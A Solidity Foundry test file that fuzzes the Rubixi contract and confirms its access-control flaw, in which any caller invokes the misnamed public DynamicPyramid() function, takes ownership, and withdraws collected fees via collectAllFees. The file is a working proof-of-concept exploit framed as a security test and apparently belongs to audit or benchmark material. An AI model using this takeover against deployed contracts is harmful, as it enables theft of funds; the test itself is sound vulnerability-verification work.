
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi private rubixi;
    address private originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        rubixi = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        // Exclude the Rubixi contract itself
        vm.assume(caller != address(rubixi));

        // --- 2. State Configuration ---
        // No special state configuration needed for this vulnerability.
        // The DynamicPyramid function is public and has no access control.

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the DynamicPyramid function which should only be callable during construction
        // but is actually public and can be called by anyone to become the creator/owner
        rubixi.DynamicPyramid();

        // Assert that the caller has successfully become the owner
        // We can verify this by checking if the caller can now call owner-only functions
        
        // Fund the contract with some fees first
        vm.deal(address(this), 1 ether);
        (bool success,) = address(rubixi).call{value: 0.5 ether}("");
        require(success, "Failed to send ether to contract");

        // Now verify the caller is the new owner by calling an onlyowner function
        vm.prank(caller);
        // This should succeed because caller is now the creator
        rubixi.changeOwner(caller);

        // Additional verification: caller can collect fees (proves ownership)
        uint256 callerBalanceBefore = caller.balance;
        vm.deal(caller, 1 ether);
        
        vm.prank(caller);
        rubixi.collectAllFees();
        
        // If we reach here without reverting, the vulnerability is confirmed
        // The arbitrary caller successfully took over ownership via DynamicPyramid()
    }
}
